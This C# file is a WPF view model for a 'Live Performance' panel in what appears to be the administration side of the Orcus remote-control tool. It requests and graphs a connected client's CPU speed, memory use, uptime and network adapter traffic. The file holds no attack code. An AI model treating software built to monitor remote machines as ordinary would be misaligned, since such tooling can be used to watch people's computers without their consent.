using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.LivePerformance;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.LivePerformance;
using Orcus.Shared.Commands.LivePerformance;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class LivePerformanceViewModel : CommandView
    {
        private ulong _availableMemory;
        private bool _canLiveUpdate;
        private string _currentCpuSpeed;
        private Dictionary<string, EthernetAdapterViewModel> _ethernetAdapterViewModels;
        private ObservableCollection<GraphPoint> _graphPoints;
        private bool _isLiveUpdateEnabled;
        private LiveData _liveData;
        private LivePerformanceCommand _livePerformanceCommand;
        private string _maximumCpuSpeed;
        private int _maxMemory;
        private StaticPerformanceData _staticPerformanceData;
        private DateTime _time;
        private string _upTime;

        public LivePerformanceViewModel()
        {
            GraphPoints = new ObservableCollection<GraphPoint>();
            _time = DateTime.Now;
            for (int i = 0; i < 60; i++)
            {
                GraphPoints.Add(new GraphPoint(_time, 0, 0));
                _time = _time.AddSeconds(1);
            }
        }

        public override string Name { get; } = (string) Application.Current.Resources["Performance"];
        public override Category Category { get; } = Category.Information;

        public bool CanLiveUpdate
        {
            get { return _canLiveUpdate; }
            set { SetProperty(value, ref _canLiveUpdate); }
        }

        public StaticPerformanceData StaticPerformanceData
        {
            get { return _staticPerformanceData; }
            set { SetProperty(value, ref _staticPerformanceData); }
        }

        public LiveData LiveData
        {
            get { return _liveData; }
            set { SetProperty(value, ref _liveData); }
        }

        public string MaximumCpuSpeed
        {
            get { return _maximumCpuSpeed; }
            set { SetProperty(value, ref _maximumCpuSpeed); }
        }

        public string CurrentCpuSpeed
        {
            get { return _currentCpuSpeed; }
            set { SetProperty(value, ref _currentCpuSpeed); }
        }

        public string UpTime
        {
            get { return _upTime; }
            set { SetProperty(value, ref _upTime); }
        }

        public bool IsLiveUpdateEnabled
        {
            get { return _isLiveUpdateEnabled; }
            set
            {
                if (SetProperty(value, ref _isLiveUpdateEnabled) && value)
                {
                    _livePerformanceCommand.GetLiveData();
                }
            }
        }

        public int MaxMemory
        {
            get { return _maxMemory; }
            set { SetProperty(value, ref _maxMemory); }
        }

        public ObservableCollection<GraphPoint> GraphPoints
        {
            get { return _graphPoints; }
            set { SetProperty(value, ref _graphPoints); }
        }

        public ulong AvailableMemory
        {
            get { return _availableMemory; }
            set { SetProperty(value, ref _availableMemory); }
        }

        public event EventHandler<List<EthernetAdapterViewModel>> AddEthernetAdapters;

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _livePerformanceCommand = clientController.Commander.GetCommand<LivePerformanceCommand>();
            _livePerformanceCommand.StaticDataReceived += _livePerformanceCommand_StaticDataReceived;
            _livePerformanceCommand.LiveDataReceived += _livePerformanceCommand_LiveDataReceived;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/StackedLineChart_16x.png", UriKind.Absolute));
        }

        public override void LoadView(bool loadData)
        {
            _livePerformanceCommand.GetStaticData();
        }

        private void _livePerformanceCommand_StaticDataReceived(object sender, StaticPerformanceData e)
        {
            StaticPerformanceData = e;
            MaximumCpuSpeed = (e.MaxClockSpeed*0.001).ToString("0.00") + " GHz";
            MaxMemory = (int) (e.TotalMemory/1000/1000);

            _ethernetAdapterViewModels =
                new Dictionary<string, EthernetAdapterViewModel>(e.EthernetAdapters.ToDictionary(x => x.Description,
                    x => new EthernetAdapterViewModel(x)));

            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                AddEthernetAdapters?.Invoke(this,
                    e.EthernetAdapters.Select(x => _ethernetAdapterViewModels[x.Description]).ToList());
            }));

            CanLiveUpdate = true;
        }

        private void _livePerformanceCommand_LiveDataReceived(object sender, LiveData e)
        {
            if (IsLiveUpdateEnabled)
                _livePerformanceCommand.GetLiveData();

            LiveData = e;
            CurrentCpuSpeed = (e.ClockSpeed*0.001).ToString("0.00") + " GHz";
            UpTime = TimeSpan.FromSeconds(e.UpTimeSeconds).ToString(@"dd\.hh\:mm\:ss");
            Application.Current.Dispatcher.BeginInvoke(
                new Action(() =>
                {
                    GraphPoints.RemoveAt(0);
                    GraphPoints.Add(new GraphPoint(_time, e.InUse,
                        (double) e.UsedMemory/StaticPerformanceData.TotalMemory*100));
                }));
            _time = _time.AddSeconds(1);

            AvailableMemory = StaticPerformanceData.TotalMemory - e.UsedMemory;

            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                foreach (var ethernetAdapterData in e.EthernetAdapterData)
                {
                    if (_ethernetAdapterViewModels.ContainsKey(ethernetAdapterData.Name))
                    {
                        var item = _ethernetAdapterViewModels[ethernetAdapterData.Name];
                        item.NewData(ethernetAdapterData);
                    }
                }
            }));
        }
    }
}